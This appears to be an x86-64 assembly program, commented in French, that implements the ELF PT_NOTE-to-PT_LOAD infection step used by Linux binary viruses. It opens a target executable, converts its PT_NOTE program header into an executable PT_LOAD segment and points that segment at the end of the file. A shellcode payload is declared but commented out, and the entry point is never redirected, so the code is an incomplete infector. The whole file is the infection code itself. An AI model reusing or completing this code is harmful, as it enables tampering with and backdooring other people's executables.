section .data
    _PT_LOAD_Value db 0x01
    flag dd 0x05
    ;my_sh db 
    ;my_sh_len equ $ - shellcode

section .bss
    buffer resb 8
    file resq 1
    Fd_file resq 1
    size_file resq 1

section .text
    global _start

_start:
; Vérifier qu'on a deux arguments
    mov r8, [rsp]
    cmp r8, 2
    je _infection_bin
    jne _error_argument

_infection_bin:
    pop rax
    pop rsi

    pop rax
    mov [file], rax

; Ouvrir le fichier
    mov rax, 2
    mov rdi, [file]
    mov rsi, 2
    syscall

    mov [Fd_file], rax
    xor rax, rax

    mov rax, 8
    mov rdi, [Fd_file]
    mov rsi, 0
    mov rdx, 2
    syscall

    mov [size_file], rax
    mov r10, 64

    jmp _Find_PT_NOTE

_Find_PT_NOTE:
    mov rax, 8
    mov rdi, [Fd_file]
    mov rsi, r10
    mov rdx, 0
    syscall

    cmp rax, [size_file]
    jge _exit_program

    mov rax, 0
    mov rdi, [Fd_file]
    mov rsi, buffer
    mov rdx, 2
    syscall

    mov ax, [buffer]
    cmp ax, 4
    je _Change_PT_NOTE_Value

    add r10, 56
    jmp _Find_PT_NOTE

_Change_PT_NOTE_Value:
; Pointeur PT_note
    mov rax, 8
    mov rdi, [Fd_file]
    mov rsi, r10
    mov rdx, 0
    syscall

; Changer PT_NOTE en PT_LOAD
    mov rax, 1
    mov rdi, [Fd_file]
    mov rsi, _PT_LOAD_Value
    mov rdx, 1
    syscall

    add r10, 4
    jmp _Change_P_Flag_Value

_Change_P_Flag_Value:
; Pointeur p_flags
    mov rax, 8
    mov rdi, [Fd_file]
    mov rsi, r10
    mov rdx, 0
    syscall

; Changer P_Flag
    mov rax, 1
    mov rdi, [Fd_file]
    mov rsi, flag
    mov rdx, 1
    syscall

    add r10, 4
    jmp _Change_P_Offset

_Change_P_Offset:

; Pointeur p_offset
    mov rax, 8
    mov rdi, [Fd_file]
    mov rsi, r10
    mov rdx, 0
    syscall

; Changement offset
    mov rax, 1
    mov rdi, [Fd_file]
    mov rsi, size_file
    mov rdx, 8
    syscall

    jmp _Close_File

_Close_File:
    mov rax, 3
    mov rdi, [Fd_file]
    syscall
    jmp _exit_program

_exit_program:
    mov rax, 60
    mov rdi, 0
    syscall

_error_argument:
    mov rax, 60
    mov rdi, 1
    syscall